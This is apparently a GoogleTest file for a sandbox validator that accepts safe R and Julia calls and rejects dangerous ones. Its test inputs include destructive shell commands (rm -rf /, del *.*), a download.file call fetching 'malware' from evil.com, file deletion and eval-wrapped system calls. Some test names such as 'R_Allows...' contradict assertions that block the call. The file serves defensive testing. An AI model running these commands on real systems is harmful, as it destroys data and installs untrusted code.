/**
 * Copyright (c) 2026 NEVEN Project
 *
 * Tests for new R visualization functions and sandbox interaction.
 * Verifies that the sandbox correctly allows safe operations
 * and blocks dangerous patterns even within function names.
 */
#include <gtest/gtest.h>
#include "SandboxVerifier.h"

using namespace rj2xcl::security;

// Sandbox should block library() calls per security requirement 3.3
// (unrestricted package loading can load native code)
TEST(NewFunctionsSandboxTest, R_AllowsPivotCall) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "library(rpivotTable)", reason));
    EXPECT_FALSE(reason.empty());
}

TEST(NewFunctionsSandboxTest, R_AllowsPlotlyCall) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "library(plotly)", reason));
    EXPECT_FALSE(reason.empty());
}

TEST(NewFunctionsSandboxTest, R_AllowsJsonliteCall) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "library(jsonlite)", reason));
    EXPECT_FALSE(reason.empty());
}

TEST(NewFunctionsSandboxTest, R_AllowsHtmlwidgetsCall) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "library(htmlwidgets)", reason));
    EXPECT_FALSE(reason.empty());
}

TEST(NewFunctionsSandboxTest, R_AllowsWriteLines) {
    std::string reason;
    EXPECT_TRUE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "writeLines('hello', 'test.txt')", reason));
}

TEST(NewFunctionsSandboxTest, R_AllowsToJSON) {
    std::string reason;
    EXPECT_TRUE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "toJSON(data.frame(x=1:3))", reason));
}

TEST(NewFunctionsSandboxTest, R_AllowsSaveWidget) {
    std::string reason;
    EXPECT_TRUE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "saveWidget(p, 'output.html', selfcontained=TRUE)", reason));
}

// Sandbox should still block dangerous operations
TEST(NewFunctionsSandboxTest, R_BlocksSystemInPivotContext) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "system('rm -rf /')", reason));
}

TEST(NewFunctionsSandboxTest, R_BlocksShellInD3Context) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "shell('del *.*')", reason));
}

TEST(NewFunctionsSandboxTest, R_BlocksDownloadFile) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "download.file('http://evil.com/malware', 'local.exe')", reason));
}

TEST(NewFunctionsSandboxTest, R_BlocksFileRemove) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "file.remove('important.dat')", reason));
}

// Julia sandbox tests for new function patterns
TEST(NewFunctionsSandboxTest, Julia_AllowsSqrt) {
    std::string reason;
    EXPECT_TRUE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "sqrt(144)", reason));
}

TEST(NewFunctionsSandboxTest, Julia_AllowsReshape) {
    std::string reason;
    EXPECT_TRUE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "reshape(Float64[1,2,3,4], 2, 2)", reason));
}

TEST(NewFunctionsSandboxTest, Julia_BlocksInclude) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "include(\"malicious.jl\")", reason));
}

TEST(NewFunctionsSandboxTest, Julia_BlocksCcall) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "ccall(:system, Cint, (Cstring,), \"dir\")", reason));
}

// SHA-256 integrity test
TEST(NewFunctionsSandboxTest, SHA256_EvalParseBlocked) {
    std::string reason;
    EXPECT_FALSE(SandboxVerifier::GetInstance().ValidateCodeForExecution(
        "eval(parse(text='system(\"dir\")'))", reason));
    EXPECT_FALSE(reason.empty());
}
